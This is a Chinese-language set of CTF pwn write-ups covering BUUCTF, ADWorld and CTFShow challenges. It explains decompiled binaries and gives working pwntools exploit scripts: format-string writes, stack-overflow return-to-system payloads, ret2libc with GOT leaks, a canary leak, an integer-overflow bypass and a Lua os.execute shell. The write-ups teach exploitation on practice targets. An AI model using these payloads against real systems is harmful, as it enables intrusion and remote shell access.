`cating`函数首先判断输入的文件名`name`是否包含子串`"flag"`，如果包含`"flag"`的话就不打印文件，否则休息`1`秒后再打印文件。

```c
int __fastcall cating(void *a1)
{
  char dest[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v3; // [rsp+8h] [rbp-18h]
  __int64 v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( strstr(name, "flag") )
    return puts("nonono,you don't have permission to cat this file!");
  *(_QWORD *)dest = 544498019LL;
  v3 = 0LL;
  v4 = 0LL;
  sleep(1u);
  strcat(dest, name);
  system(dest);
  return 0;
}
```

返回`menu()`函数，双击`editname()`函数查看详情。

```c
ssize_t editname()
{
  puts("Input new name you want to change.");
  return read(0, name, 0x14uLL);
}
```

因为`cat`函数打印文件时开启了新线程，所以我们在调用`cat`函数后再修改`name`中的内容时，线程中`name`的内容也能随之改变。编写`Python`代码求解得到`flag{c35c2250-d53a-4ccf-bd23-ca83bd33c38c}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25260)
io.sendlineafter(b'==>', b'2')
io.sendlineafter(b'Input the file name you want to cat.\n', b'bin')
io.sendlineafter(b'==>', b'3')
io.sendlineafter(b'Input new name you want to change.\n', b'flag')
io.interactive()
```

------

### ♥ sheep a flag

先`file ./sheep_a_flag `查看文件类型，再`checksec --file=./sheep_a_flag`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
└─$ file ./sheep_a_flag
./sheep_a_flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36f054c25f8da1dfdddf7cf8ee09561038a6bd51, stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/sheep a flag]
└─$ checksec --file=./sheep_a_flag
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/sheep a flag/sheep_a_flag'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`sheep_a_flag`，按`F5`反汇编源码并查看主函数。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  unsigned int v5; // [rsp+4h] [rbp-92Ch] BYREF
  unsigned int v6; // [rsp+8h] [rbp-928h] BYREF
  unsigned int *v8; // [rsp+10h] [rbp-920h]
  unsigned int *v9; // [rsp+18h] [rbp-918h]
  char v10[2312]; // [rsp+20h] [rbp-910h] BYREF
  unsigned __int64 v11; // [rsp+928h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v5 = 0;
  v6 = 0;
  v8 = &v5;
  v9 = &v6;
  v3 = time(0LL);
  srand(v3);
  sub_400897(v10, a2);
  sub_400A3B(v10, 12LL, 12LL);
  sub_400E09(v10, v8, v9);
  sub_400CAC(v10, v5, v6);
  if ( !(unsigned int)sub_400F63(v10, v5, v6) )
    return 0LL;
  puts("Congratulate! Thanks for you let the sheep get the flag!");
  puts("Here is your gift! You get a Fmt_Sheep!");
  puts("Try to use it ?!");
  sub_401179();
  if ( dword_602080 == 1919810 )
  {
    puts("\nIt seems that this Fmt_Sheep likes you!");
    system("$0");
  }
  else
  {
    puts("\nSorry... The Fmt_Sheep hates you!");
  }
  return 0LL;
}
```

`sub_400CAC()`函数将程序生成的迷宫打印输出，`sub_400F63()`函数判断输入的路径能否走出迷宫。

```c
__int64 __fastcall sub_400F63(__int64 a1, int a2, int a3)
{
  char v5; // [rsp+1Bh] [rbp-95h]
  int v7; // [rsp+20h] [rbp-90h]
  int i; // [rsp+24h] [rbp-8Ch]
  char buf[120]; // [rsp+30h] [rbp-80h] BYREF
  unsigned __int64 v10; // [rsp+A8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("Plz Input Your Ans: ");
  read(0, buf, 0x64uLL);
  v7 = 0;
  for ( i = 0; buf[i] && buf[i] != 10 && buf[i] != 32; ++i )
  {
    v5 = buf[i];
    switch ( v5 )
    {
      case 'w':
        --a2;
        break;
      case 's':
        ++a2;
        break;
      case 'a':
        --v7;
        break;
      case 'd':
        ++v7;
        break;
    }
    if ( a2 < 0 || a2 > 23 || v7 < 0 || v7 > 23 )
    {
      printf("You get out of maze! [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
      return 0LL;
    }
    if ( !*(_DWORD *)(a1 + 96LL * a2 + 4LL * v7) )
    {
      printf("You hit the wall... [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
      return 0LL;
    }
  }
  if ( a2 == a3 && v7 == 23 )
    return 1LL;
  puts("You are not out of this maze...");
  return 0LL;
}
```

求解迷宫路径的代码如下：

```python
from pwn import*

ans = ''
v = []
map = []
def dfs(res,x,y):
    global ans
    if x == flag_x and y == flag_y:
        ans = res
        return
    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
        v[x-1][y] = 1
        dfs(res+'w', x-1, y)
        v[x-1][y] = 0
    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
        v[x][y-1] = 1
        dfs(res+'a', x, y-1)
        v[x][y-1] = 0
    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
        v[x][y+1] = 1
        dfs(res+'d', x, y+1)
        v[x][y+1] = 0
    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
        v[x+1][y] = 1
        dfs(res+'s', x+1, y)
        v[x+1][y] = 0
    return


io = remote('node4.buuoj.cn', 25870)
sheep_x = -1
sheep_y = -1
flag_x = -1
flag_y = -1
io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
for i in range(24):
    x=[]
    y=[]
    a = io.recvline().decode()
    for j in range(24):
        y.append(0)
        if a[j] == '🈲':
            x.append(0)
        if a[j] == '⬛':
            x.append(0)
        if a[j] == '⬜':
            x.append(1)
        if a[j] == '🐏':
            x.append(2)
            sheep_x = i
            sheep_y = j
        if a[j] == '🚩':
            x.append(3)
            flag_x = i
            flag_y = j
    map.append(x)
    v.append(y)
    print(a, end='')


log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
dfs('', sheep_x, sheep_y)
log.info('The path to pass maze is: %s' % ans)
io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
```

走出迷宫后就能继续执行程序，其中`sub_401179()`函数将程序跳转到`0x40119C`处执行。

```
void sub_401179()
{
  JUMPOUT(0x40119CLL);
}
```

地址`0x40119C`是`sub_40119C()`函数的起始地址，根据注释可知局部变量`v0`是`rbp`寄存器所在地址，`read()`函数在`(void *)(v0-96)`这个偏移地址读入了`0x50`字节的数据。回到主函数中，`if`语句判断条件`dword_602080 == 1919810`，若为真就执行`system("$0")`，即可得到靶机的`shell`。`1919810`就是`0x1d4b42`，因此我们需要利用格式化字符串漏洞，将`1d`，`4b`，`42`这三个字节数据分别写入地址`0x602080`，`0x602081`，`0x602082`。`hhn`是写入一个字节。

```c
unsigned __int64 __fastcall sub_40119C()
{
  __int64 v0; // rbp

  read(0, (void *)(v0 - 96), 0x50uLL);
  printf((const char *)(v0 - 96));
  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);
}
```

编写`Python`代码求解得到`flag{4c62e57e-9603-47be-be0c-1dcf75fc1e3d}`。

```python
from pwn import*

ans = ''
v = []
map = []
def dfs(res,x,y):
    global ans
    if x == flag_x and y == flag_y:
        ans = res
        return
    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
        v[x-1][y] = 1
        dfs(res+'w', x-1, y)
        v[x-1][y] = 0
    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
        v[x][y-1] = 1
        dfs(res+'a', x, y-1)
        v[x][y-1] = 0
    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
        v[x][y+1] = 1
        dfs(res+'d', x, y+1)
        v[x][y+1] = 0
    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
        v[x+1][y] = 1
        dfs(res+'s', x+1, y)
        v[x+1][y] = 0
    return


io = remote('node4.buuoj.cn', 25870)
sheep_x = -1
sheep_y = -1
flag_x = -1
flag_y = -1
io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
for i in range(24):
    x=[]
    y=[]
    a = io.recvline().decode()
    for j in range(24):
        y.append(0)
        if a[j] == '🈲':
            x.append(0)
        if a[j] == '⬛':
            x.append(0)
        if a[j] == '⬜':
            x.append(1)
        if a[j] == '🐏':
            x.append(2)
            sheep_x = i
            sheep_y = j
        if a[j] == '🚩':
            x.append(3)
            flag_x = i
            flag_y = j
    map.append(x)
    v.append(y)
    print(a, end='')


log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
dfs('', sheep_x, sheep_y)
log.info('The path to pass maze is: %s' % ans)
io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
payload=b'%29c%10$hhn%37c%11$hhn%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)
io.sendlineafter(b'Try to use it ?!\n', payload)
io.interactive()
```

------

## ADWorld

### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)

先`file ./get_shell`查看文件类型再`checksec --file=get_shell`检查一下文件保护情况。`nc`进去`ls`后发现可以直接`cat flag`，从而得到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/1.png)

提交`flag`后，我还是决定用`IDA Pro 64bit`打开附件`get_shell`来分析一下，发现该程序输出字符串后直接给定了一个系统调用。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/2.png)

可以按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/3.png)

编写`Python`代码拿到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

```python
from pwn import *

io = remote('111.200.241.244', 59901)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/4.png)

------

### [hello_pwn](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1)

先`file ./hello_pwn`查看文件类型再`checksec --file=hello_pwn`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/1.png)

用`IDA Pro 64bit`打开附件`hello_pwn`，按`F5`反汇编源码并查看主函数，发现`read()`函数很可疑，双击`unk_601068`变量查看其在内存中的地址情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/2.png)

发现`unk_601068`变量和`dword_60106C`的偏移量为`0x4`，这个数值小于`read()`函数的范围限制。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/3.png)

当`dword_60106C`的数值等于`1853186401`时会调用子函数`sub_400686()`，查看详情发现该子函数是系统调用`cat flag.txt`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/4.png)

构造`payload`时先用`4`个字节占满`unk_601068`变量，再用`p64()`函数将`dword_60106C`的数值赋值为`1853186401`，编写`Python`代码即可得到`cyberpeace{285b4e962d0debee56c43f8f174f2e22}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/5.png)

------

### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)

先`file ./level0`查看文件类型再`checksec --file=level0`一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/1.png)

用`IDA Pro 64bit`打开附件`level0`，按`F5`反汇编源码并查看主函数，发现`vulnerable()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/2.png)

双击`vulnerable()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x200`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x80`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/4.png)

在`Function Window`中注意到有一个名为`callsystem()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`callsystem()`函数的起始地址`0x400596`即可。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/5.png)

编写`Python`代码即可得到`cyberpeace{abcdc2f34ed094260c9ef32f07e7465b}`。

```python
from pwn import *

io = remote('111.200.241.244', 53710)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => %s' % hex(address).upper())
payload = b'a'*(0x80) + b'fuckpwn!' + p64(address)
# payload = b'a'*(0x80) + b'fuckpwn!' + p64(0x400596)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/6.png)

------

### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)

先`file ./level2`查看文件类型再`checksec --file=level2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/1.png)

用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数，发现`vulnerable_function()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/2.png)

双击`vulnerable_function()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x88`，即可用栈大小只有`136`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/4.png)

双击`system()`函数查看详情，函数返回值直接是系统调用，因此构造`payload`时需要再加上`system()`函数的起始地址`0x8048320`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/5.png)

`p32()`可以让我们将整数转换为`4`字节的小端序格式，`system()`函数的参数`command`要求`dword ptr 4`，所以进入到`system()`函数后，还需要构造`system()`函数的栈帧，我们可以用`0xDEADBEEF`来填充已分配但还未初始化的内存，也可以用`p32(0)`来填充四个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/6.png)

最后再加上`system()`函数中的参数`/bin/sh`的地址即可获得`shell`。这里用了`ELF`中的`search()`函数来获取`/bin/sh`的地址。

编写`Python`代码即可得到`cyberpeace{5f581b52af1ababeb4636a8c9911e25d}`。

```python
from pwn import *

io = remote('111.200.241.244', 53598)
e = ELF('level2')
system_address = e.symbols['system']
log.success('system_address => %s' % hex(system_address).upper())
bin_sh_address = e.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s' % hex(bin_sh_address).upper())
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xDEADBEEF) + p32(bin_sh_address)
# payload = b'a'*0x88 + b'fuck' + p32(0x8048320) + p32(0) + p32(0x804A024)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/7.png)

------





------

### [int_overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058)

先`file ./int_overflow`查看文件类型再`checksec --file=int_overflow`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/1.png)

用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，显然首先要发送`1`来进入`login()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/2.png)

双击`login()`函数查看详情，不存在栈溢出，程序接受了一个最大长度为`0x199`的`password`，并将其作为参数传递给了`check_passwd()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/3.png)

双击`check_passwd()`函数查看详情，程序用了一个`8bit`的无符号整型变量存储`password`的长度，之后用字符串拷贝函数`strcpy()`将其拷贝到一个长度为`0x14`的`char`型变量`dest`中。`8bit`能表示的十进制范围是`0~255`，而`password`的最大长度为`0x199`（十进制为 409），长度远大于`1`字节，存在整数溢出。`password`字符串的长度可以是`4~8`个字符，也可以是`259~263`个字符，因此我们可以利用整数溢出来绕过`if`判断从而构造栈溢出。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/4.png)

在`Function Window`中注意到有一个名为`what_is_this()`的函数，函数返回值直接是系统调用`system("cat flag")`，因此构造`payload`时需要再加上这个`what_is_this()`函数的起始地址`0x804868B`，当然也可以`ELF`再`symbols['what_is_this']`来获取。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/5.png)

编写`Python`代码即可得到`cyberpeace{8f9f902ebeb37850f02feee9facc249d}`。

```python
from pwn import *

io = remote('111.200.241.244', 55529)
e = ELF('./int_overflow')
io.sendlineafter(b'Your choice:', b'1')
io.sendlineafter(b'Please input your username:', b't0ur1st')
payload = b'a'*0x14 + b'pwn!' + p32(e.symbols['what_is_this'])
payload = payload.ljust(263, b'a')
io.sendlineafter(b'Please input your passwd:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/6.png)

------

### [cgpwn2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5059)

先`file ./cgpwn2`查看文件类型再`checksec --file=cgpwn2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/1.png)

用`IDA Pro 32bit`打开附件`cgpwn2`，按`F5`反汇编源码并查看主函数，发现`hello()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/2.png)

双击`hello()`函数查看详情，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x26`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/3.png)

注意到`name`是`bss`段中一个大小为`0x34`的区域，变量`s`的起始位置在程序运行时距离栈帧有`0x26`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/4.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/5.png)

构造`payload`时可以先传入`/bin/sh`给`name`，接着用`0x26`个字节占满`s`变量，然后再用`4`个字节覆盖到`r`，最后指向`system()`函数和`name`的地址，从而完成系统调用。编写`Python`代码即可得到`cyberpeace{0de31e1800e130387c77fabf5ece76c9}`。

```python
from pwn import *

io = remote('111.200.241.244', 56171)
e = ELF('./cgpwn2')
system_address = e.symbols['system']
info('system_address => 0x%x', system_address)
name_address = 0x804A080 
payload = b'a'*0x26 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(name_address)
io.sendlineafter(b'please tell me your name', b'/bin/sh')
io.sendlineafter(b'hello,you can leave some message here:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/6.png)

------

### [level3](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5060)

先`file ./level3`查看文件类型再`checksec --file=level3`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/1.png)

用`IDA Pro 32bit`打开附件`level3`，可以看到主函数如下：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/2.png)

双击`vulnerable_function`查看详情：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/3.png)

按`F5`反汇编源码可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/4.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/5.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。接着我们可以用题目附件给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。

编写`Python`代码即可得到`cyberpeace{e1aa176d2d3aca8bc677d1c25dc9d919}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('111.200.241.244', 51304)
e = ELF('./level3')
write_plt = e.plt['write'] # 0x8048340
info('write_plt => 0x%x', write_plt)
write_got = e.got['write'] # 0x804a018
info('write_got => 0x%x', write_got)
main_address = e.symbols['main'] # 0x8048484
info('main_address => 0x%x', main_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Input:\n', payload)
write_address = u32(io.recv(4)) 
log.success('write_address => %s', hex(write_address))
libc = ELF('./libc/libc_32.so.6')
libcbase = write_address - libc.symbols['write']
log.success('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system'] 
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__() 
log.success('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/6.png)

------

### [Mary_Morton](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4979)

先`file ./Mary_Morton`查看文件类型再`checksec --file=Mary_Morton`检查一下文件保护情况。`Canary found`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/1.png)

用`IDA Pro 64bit`打开附件`Mary_Morton`，按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/2.png)

双击`sub_4009FF()`函数查看详情。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/3.png)

双击`sub_4009DA()`函数查看详情。通过观察主函数后面的代码发现这部分代码并没有骗人，输入`1`确实可以看到栈溢出漏洞，输入`2`确实存在格式化字符串漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/4.png)

双击`sub_4008EB()`函数查看详情，我们可以利用该函数的格式化漏洞来泄露出`canary`的值。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/5.png)

双击`sub_400960()`函数查看详情，我们可以利用该函数的栈溢出漏洞来让程序执行后门函数从而拿到`flag`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/6.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/7.png)

编写`Python`代码即可得到`cyberpeace{2b62375defc58c432dee9e3903b48022}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 51303)
io.sendlineafter(b'3. Exit the battle', b'2')
io.sendline(b'%23$p')
io.recvuntil(b'0x')
canary = int(io.recv(16), 16)
flag_addr = 0x4008da
io.sendlineafter(b'3. Exit the battle', b'1')
payload = b'a'*0x88 + p64(canary) + b'a'*8 + p64(flag_addr)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/8.png)

------

### [反应釜开关控制](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4912)

先`file ./pwn4912`查看文件类型再`checksec --file=./pwn4912`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/1.png)

用`IDA Pro 64bit`打开附件`pwn4912`，按`F5`反汇编源码并查看主函数。注意到`char`型数组变量`v5`的可用栈大小为`0x200`，但是`get()`函数读取输入到`v5`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/2.png)

双击`v5`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x200`个字节占满`v5`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/3.png)

在`Functions window`中可以看到有一个名为`shell()`的函数，其返回值直接是系统调用`system("/bin/sh")`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/4.png)

编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *

io = remote('111.200.241.244', 51772)
e = ELF('./pwn4912')
shell_address = e.symbols['shell']
payload = b'a'*0x200 + b'fuckpwn!' + p64(shell_address)
io.sendlineafter(b'>', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/5.png)

------

### [pwn1](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4598)

先`file ./pwn1`查看文件类型再`checksec --file=./pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4598/1.png)

用`IDA Pro 64bit`打开附件`pwn1`，按`F5`反汇编查看主函数源码：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(s, 0, 0x80uLL);
  while ( 1 )
  {
    sub_4008B9();
    v3 = sub_400841();
    switch ( v3 )
    {
      case 2:
        puts(s);
        break;
      case 3:
        return 0LL;
      case 1:
        read(0, s, 0x100uLL);   //这里就是栈溢出漏洞点
        break;
      default:
        sub_400826("invalid choice");
        break;
    }
    sub_400826(&unk_400AE7);
  }
}
```

双击`sub_4008B9()`函数查看详情，可以看到有三个可选项：

```c
__int64 sub_4008B9()
{
  sub_400826("--------");
  sub_400826("1.store");
  sub_400826("2.print");
  sub_400826("3.quit");
  sub_400826("--------");
  return sub_4007F7(">> ");
}
```

由于文件开启了`canary`保护，所以我们需要先泄露`canary`。而栈溢出漏洞点就在选择`1`后的`read(0, s, 0x100uLL);`，读取的字符长度超出了`char`型数组的定义长度。此外，我们还需要用`ROPgadget`找到`pop_rdi_ret`的地址：

```bash
ROPgadget --binary ./babystack --only "pop|ret"
```

接着就可以绕开`canary`保护，利用`puts()`函数的`got`表和`plt`表来泄露`puts()`函数在内存中的地址，从而得到`libc`的版本信息和`libc`的基址地址，最后构造`ROP`链来获取`shell`。编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 56617)
e = ELF('./babystack')
 
def get_info():
	info = io.recvline()
	return info
 
def store_info(payload):
	io.sendlineafter(b'>> ', b'1')
	io.sendline(payload)
	return get_info()
 
 
def print_info():
	io.sendlineafter(b'>> ', b'2')
	return get_info()
 
#leak canary
payload = b'a'*0x88
store_info(payload)
print_info()
canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("canary => %#x", canary)

# leak libcbase_address 
pop_rdi = 0x400a93
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_address = 0x400908
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.info("puts_address => %#x", puts_address)
libc = LibcSearcher('puts', puts_address)  # libc6_2.23-0ubuntu10_amd64
libcbase = puts_address - libc.dump('puts')

# get shell
system_address = libcbase + libc.dump('system')
log.success("system_address => %#x", system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success("binsh_address => %#x", bin_sh_address)
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, bin_sh_address, system_address, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
io.interactive()
```

------

### [Aul](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=5009)

这道题没有附件，`nc`进去之后就是玩游戏，输入`help`后发现这是个`lua`程序，而下面的乱码像是`lua`的字节码。

```bash
nc 111.200.241.244 53412
help
os.execute("/bin/sh")
ls
cat flag
```

输入`os.execute("/bin/sh")`可以调用`shell`，`ls`后`cat flag`可以得到`cyberpeace{bd2ac997dde16e9d40620def86a5df67}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5009/1.png)

------

## CTFShow

### pwn02

先`file ./stack`查看文件类型再`checksec --file=stack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn02/1.png)

用`IDA Pro 32bit`打开附件`stack`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn02/2.png)

双击`pwnme()`函数可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数限制输入50个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn02/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn02/4.png)

在`Function Window`中注意到有一个名为`stack()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`stack()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn02/5.png)

编写`Python`代码即可得到`ctfshow{62a18b45-a931-4c43-9a7a-21726633f01e}`。

![](https://paper.tanyaodan.com/CTFShow/pwn02/6.png)

------

### pwn03

先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。

